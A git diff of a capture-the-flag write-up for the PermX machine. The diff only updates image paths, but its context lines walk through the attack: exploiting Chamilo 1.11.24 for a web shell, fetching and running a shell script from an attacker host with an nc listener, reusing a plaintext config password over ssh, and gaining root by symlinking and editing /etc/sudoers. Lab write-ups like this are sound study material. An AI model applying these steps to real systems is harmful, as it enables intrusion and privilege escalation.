@@ -16,7 +16,7 @@ echo "10.129.35.142 permx.htb" | sudo tee -a /etc/hosts
 ### Webapp
 
 Upon entering the website at `permx.htb`, I am met with an Online Learning Platform
-![Pasted image 20260725132127](Pasted%20image%2020260725132127.png)
+![Pasted image 20260725132127](Images/Pasted%20image%2020260725132127.png)
 
 Wandering through the site I found nothing useful or interesting so the next logical step is to try to find hidden files and folders or even hidden subdomains
 - The search for hidden files or directories was not that useful
@@ -25,10 +25,10 @@ Wandering through the site I found nothing useful or interesting so the next log
 ffuf -u http://permx.htb/ -H 'Host: FUZZ.permx.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 150 -ic -fc 302
 ```
 - The subdomains `www` and `lms` 
-![Pasted image 20260725132617](Pasted%20image%2020260725132617.png)
+![Pasted image 20260725132617](Images/Pasted%20image%2020260725132617.png)
 
 The `www` subdomain does not lead to valuable information so maybe `lms` will provide something more "exploitable"
-![Pasted image 20260725132740](Pasted%20image%2020260725132740.png)
+![Pasted image 20260725132740](Images/Pasted%20image%2020260725132740.png)
 - It sure did as now I can see a login form and a website that belongs to a software named `Chamilo` , used for digital learning and stuff
 
 Next step is to find somehow the version of this soft as maybe it is a vulnerable one
@@ -36,11 +36,11 @@ Next step is to find somehow the version of this soft as maybe it is a vulnerabl
 ```bash
 ffuf -u http://lms.permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -t 150
 ```
-![Pasted image 20260725134136](Pasted%20image%2020260725134136.png)
+![Pasted image 20260725134136](Images/Pasted%20image%2020260725134136.png)
 - a lot of hidden directories appeared and so I have to go through them and check if any of them contain something interesting
 
 What I was looking for was inside the `/documentation/changelog.html` file which provides a list of every past version until the current one
-![Pasted image 20260725134845](Pasted%20image%2020260725134845.png)
+![Pasted image 20260725134845](Images/Pasted%20image%2020260725134845.png)
 - Since the last version that appears here is `1.11.24` I assume that this is the software version 
 
 Having the `Chamilo 1.11.24` version known, a little search on Google about vulnerabilities regarding the app, won't hurt
@@ -83,7 +83,7 @@ if __name__ == "__main__":
     main()
 ```
 - To check if the script work I will send the command `id` through the web shell
-![Pasted image 20260725135808](Pasted%20image%2020260725135808.png)
+![Pasted image 20260725135808](Images/Pasted%20image%2020260725135808.png)
 - The script worked as it gave me the id of the `www-data` user back
 
 Now to get an active connection:
@@ -99,7 +99,7 @@ python3 -m http.server 80
 3. Change the value of the `cmd` variable inside the python exploit to `wget http://10.10.16.53/shell.sh;bash ./shell.sh`
 4. Open a listener inside a terminal with  `nc -lvnp 4444`
 5. Run the exploit with `python3 ./exp.py` and go back to the terminal where the listener was running and voila, a reverse shell as the `www-data` user is present
-![Pasted image 20260725141551](Pasted%20image%2020260725141551.png)
+![Pasted image 20260725141551](Images/Pasted%20image%2020260725141551.png)
 
 ### Foothold
 
@@ -108,18 +108,18 @@ Having the a shell on the system I have to gain access to the next user that has
 ```bash
 ls -la /home
 ```
-![Pasted image 20260725141928](Pasted%20image%2020260725141928.png)
+![Pasted image 20260725141928](Images/Pasted%20image%2020260725141928.png)
 - From the output I discover that my next target is the `mtz` user
 
 Now to find a password for this user, the most usual location is inside a config file in the web app, as it is very common for users to use the same password for multiple things
 - My friend Google says that since version `1.11.x` Chamilo holds the config settings in the `/app/config/configuration.php` file, so a quick look may be worth
-![Pasted image 20260725142506](Pasted%20image%2020260725142506.png)
+![Pasted image 20260725142506](Images/Pasted%20image%2020260725142506.png)
 - The existence of the config file was proven and because it is a large file the best way is to use `grep` to get only the fields that contain the word `password`
 ```bash
 cat /var/www/chamilo/app/config/configuration.php | grep "password"
 ```
 - Through the first lines a password can be found
-![Pasted image 20260725142810](Pasted%20image%2020260725142810.png)
+![Pasted image 20260725142810](Images/Pasted%20image%2020260725142810.png)
 - The password is: `03F6lY3uXAP2bkW8`
 
 Having a password next step would be to use it to try to authenticate as the `mtz` user through ssh
@@ -128,12 +128,12 @@ ssh mtz@permx.htb
 Password: 03F6lY3uXAP2bkW8
 ```
 - The connection went through so now I have access as the `mtz` user and also to the user flag
-![Pasted image 20260725143129](Pasted%20image%2020260725143129.png)
+![Pasted image 20260725143129](Images/Pasted%20image%2020260725143129.png)
 
 ## System Flag
 
 The command `sudo -l` comes with a response that makes the start of the privilege escalation process
-![Pasted image 20260725143222](Pasted%20image%2020260725143222.png)
+![Pasted image 20260725143222](Images/Pasted%20image%2020260725143222.png)
 - I can run with `sudo` the script `/opt/acl.sh` so let's check it
 
 The file reveals a bash script that is quite interesting:
@@ -185,7 +185,7 @@ The plan is done, so now I have to follow it:
 ```bash
 ln -s /etc/sudoers root
 ```
-![Pasted image 20260725144919](Pasted%20image%2020260725144919.png)
+![Pasted image 20260725144919](Images/Pasted%20image%2020260725144919.png)
 2. Ran the script
 ```bash
 sudo /opt/acl.sh mtz rwx /home/mtz/root
@@ -194,9 +194,9 @@ sudo /opt/acl.sh mtz rwx /home/mtz/root
 ```bash
 echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
 ```
-![Pasted image 20260725145357](Pasted%20image%2020260725145357.png)
+![Pasted image 20260725145357](Images/Pasted%20image%2020260725145357.png)
 4. Just run `sudo /bin/bash` and I've got `root` access to the system
-![Pasted image 20260725145624](Pasted%20image%2020260725145624.png)
+![Pasted image 20260725145624](Images/Pasted%20image%2020260725145624.png)
 
 **Note**
 - Try to do it fast as there is a script that will revert the changes at some time
